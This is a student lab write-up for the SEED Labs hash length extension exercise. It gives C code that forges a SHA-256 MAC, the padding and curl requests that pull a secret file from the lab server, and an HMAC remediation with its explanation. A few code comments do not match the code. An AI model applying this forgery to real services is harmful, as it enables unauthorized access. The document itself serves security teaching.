# Hash Length Extension Attack Lab

**Team:** Evan Schreiner & Will Curry
**Fall 2025**


## Project Overview
This repo contains our work for the SEED Labs Hash Length Extension Attack.
- **Evan:** Tasks 1 & 2 (Setup, MAC Analysis, Padding Calculation)
- **Will:** Tasks 3 & 4 (Attack Execution, HMAC Remediation)


## Task 1 & 2

### 1. Target Information

We are attacking the server at `www.seedlab-hashlen.com` (10.9.0.80).
* **Student Name used:** `EvanSchreiner`
* **UID:** `1001`
* **Key:** `123456` (Found in `key.txt`)

### 2. The Baseline Request

This is the valid request we generated. We will extend this message.
* **Original Command String (R):** `myname=EvanSchreiner&uid=1001&lstcmd=1`
* **Original MAC Hash:** `53f5e9d89774bf0f1050fb4cadc83ca04465e56afd17a3cde64c64c989a9faa1`
    * *Note: You must use this hash to initialize the registers in `length_ext.c`.*

### 3. The Calculated Padding
I calculated the SHA-256 padding for the 64-byte block.
* **Padding Hex:** `80000000000000000000000000000000000168`
* **Padding URL Encoded:** `%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%01%68`
* **Length Field (Hex):** `0x168` (360 bits)


## Task 3
**Objective:** Forge a signature for `&download=secret.txt` without knowing the key.

1.  Open `length_ext.c`.
2.  Input the **Original MAC Hash** (from Section 2 above) into the `c.h[]` registers.
    * *Note: Use `htole32` because our VM is Little Endian.*

3.  Update the length field in the code to `64 + len("Extra message")`.
    * *Note: The C code needs the total length of the forged message to finalize the hash correctly.*

`length_ext.c` now looks like the following after steps 2 and 3:

```c
#include <stdio.h>
#include <arpa/inet.h>
#include <openssl/sha.h>

int main(int argc, const char *argv[]) {
        int i;
        unsigned char buffer[SHA256_DIGEST_LENGTH];
        SHA256_CTX c;

        SHA256_Init(&c);

        // Process Original Message Length
        for(i=0; i<64; i++)
                SHA256_Update(&c, "*", 1);

        // TODO: Paste the Original MAC hash from Task 1 below.
        // Break the hash into 8 chunks of 8 hex characters.
        c.h[0] = htole32(0x53f5e9d8);
        c.h[1] = htole32(0x9774bf0f);
        c.h[2] = htole32(0x1050fb4c);
        c.h[3] = htole32(0xadc83ca0);
        c.h[4] = htole32(0x4465e56a);
        c.h[5] = htole32(0xfd17a3cd);
        c.h[6] = htole32(0xe64c64c9);
        c.h[7] = htole32(0x89a9faa1);
        // continue...

        // Total length of the forged message = (Key + Message + Padding).
        // 64 bytes (original block) + 13 bytes ("&download=secret.txt") * 8 bits/byte

        //c.Nl = (64 + 20) * 8;
        //c.Nh = 0;

        // Append the extra message
        SHA256_Update(&c, "&download=secret.txt", 20);

        SHA256_Final(buffer, &c);

        // Print the new forged MAC
        for(i=0; i<32; i++) {
                printf("%02x", buffer[i]);
        }
        printf("\n");
        return 0;
}
```

4.  Compile and Run:
    ```bash
    gcc length_ext.c -o length_ext -lcrypto
    ./length_ext
    ```

    Result from running:
    ```4e298ec304997adebe2f3f037a72a6efc6398514e8215fafd9d6a1ed455cebd1```
    
5.  Construct the Attack URL:
    `http://www.seedlab-hashlen.com/?myname=EvanSchreiner&uid=1001&lstcmd=1` + `[Padding URL Encoded]` + `&download=secret.txt` + `&mac=[New_Forged_MAC]`

URL contructed:
    ```http://www.seedlab-hashlen.com/?myname=EvanSchreiner&uid=1001&lstcmd=1%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%01%68&download=secret.txt&mac=4e298ec304997adebe2f3f037a72a6efc6398514e8215fafd9d6a1ed455cebd1```

**To perform the attack:**
```bash
curl "http://www.seedlab-hashlen.com/?myname=EvanSchreiner&uid=1001&lstcmd=1%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%01%68&download=secret.txt&mac=4e298ec304997adebe2f3f037a72a6efc6398514e8215fafd9d6a1ed455cebd1"
```

**Expected result:**
<img width="688" height="420" alt="image" src="https://github.com/user-attachments/assets/d9c84e1a-c3e6-4623-b92b-ff1c2b800d05" />


## Task 4 (Remediation)

1. Replace the insecure SHA-256 concatenation with `hmac.new`.

The current SHA-256 concatenation occurs in `lab.py`. From the orignal lab instalation, that is found for MacOS at `~/Downloads/finalLab/Labsetup-arm/image_flask/app/www/`, and for Windows at `~/Labsetup/Labsetup/image_flask/app/www/`. 

Though, in our Git repo, we have it simply at `/hash_attack_repo/lab.py`

New `verfy_mac` function (changes being removed commented out, and the new addition following it):

```python
def verify_mac(key, my_name, uid, cmd, download, mac):
    download_message = '' if not download else '&download=' + download
    message = ''
    if my_name:
        message = 'myname={}&'.format(my_name)
    message += 'uid={}&lstcmd='.format(uid) + cmd + download_message
    #payload = key + ':' + message
    #app.logger.debug('payload is [{}]'.format(payload))
    #real_mac = hashlib.sha256(payload.encode('utf-8', 'surrogateescape')).hexdigest()

    app.logger.debug('message is [{}]'.format(message))

    real_mac = hmac.new(
        bytearray(key.encode('utf-8')),
        msg=message.encode('utf-8', 'surrogateescape'),
        digestmod=hashlib.sha256
    ).hexdigest()

    app.logger.debug('real mac is [{}]'.format(real_mac))
    if mac == real_mac:
        return True
    return False
```

2.  Rebuild the docker container (`dcbuild && dcup`) and verify the attack above no longer works. If docker is running, do `dcdown` first to shut down the running server.

URL contructed in Part 3
    ```http://www.seedlab-hashlen.com/?myname=EvanSchreiner&uid=1001&lstcmd=1%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%01%68&download=secret.txt&mac=4e298ec304997adebe2f3f037a72a6efc6398514e8215fafd9d6a1ed455cebd1```

**Perform Attack:**
```bash
curl "http://www.seedlab-hashlen.com/?myname=EvanSchreiner&uid=1001&lstcmd=1%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%01%68&download=secret.txt&mac=4e298ec304997adebe2f3f037a72a6efc6398514e8215fafd9d6a1ed455cebd1"
```

**Expected Result**
<img width="957" height="469" alt="image" src="https://github.com/user-attachments/assets/cfefafab-f349-4b7a-9b76-234523cf08a9" />

3.  Repeat Task 1 to send a request to list files while using HMAC
for the MAC calculation.

To do this, we created a new file called `hmac_mac.py` That looks like the following...

This computes HMAC!

```python
#!/bin/env python3
import hmac
import hashlib
key='123456'
message='myname=EvanSchreiner&uid=1001&lstcmd=1'
mac = hmac.new(bytearray(key.encode('utf-8')),
    msg=message.encode('utf-8', 'surrogateescape'),
    digestmod=hashlib.sha256).hexdigest()
print(mac)

real_mac = hmac.new(bytearray(key.encode('utf-8')),
    msg=message.encode('utf-8', 'surrogateescape'),
    digestmod=hashlib.sha256).hexdigest()
```

**Expected Result of `hmac_mac.py`**
```
694f119a8f200dfbe7a4f14750803081ee6a79f1d9be2a8e59f11a588cc98f25
```


Run Task 1 request to list files again with HMAC
```bash
curl "http://www.seedlab-hashlen.com/?myname=EvanSchreiner&uid=1001&lstcmd=1&mac=694f119a8f200dfbe7a4f14750803081ee6a79f1d9be2a8e59f11a588cc98f25"
```

**Expected Result**
<img width="951" height="670" alt="image" src="https://github.com/user-attachments/assets/2d8d61df-5f2e-4c2f-ba91-f99dcdbbd08a" />


**Run attack with new HMAC in URL:**
```bash
curl "http://www.seedlab-hashlen.com/?myname=EvanSchreiner&uid=1001&lstcmd=1%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%01%68&download=secret.txt&mac=694f119a8f200dfbe7a4f14750803081ee6a79f1d9be2a8e59f11a588cc98f25"
```

**Expected result**
<img width="941" height="470" alt="image" src="https://github.com/user-attachments/assets/0c4a39eb-9deb-4665-b4f5-f14d7d89fa16" />

**_Why will a malicious request using length extension and extra commands will fail MAC verification when the client and server use HMAC?_**

When using HMAC, the message is hashed in 2 stages using a secret key and fixed padding values for each layer. By extending the message, the inside layer gets changed before being hashed for the final MAC output, causing the final MAC to no longer match what is expected and therefore the verification fails.







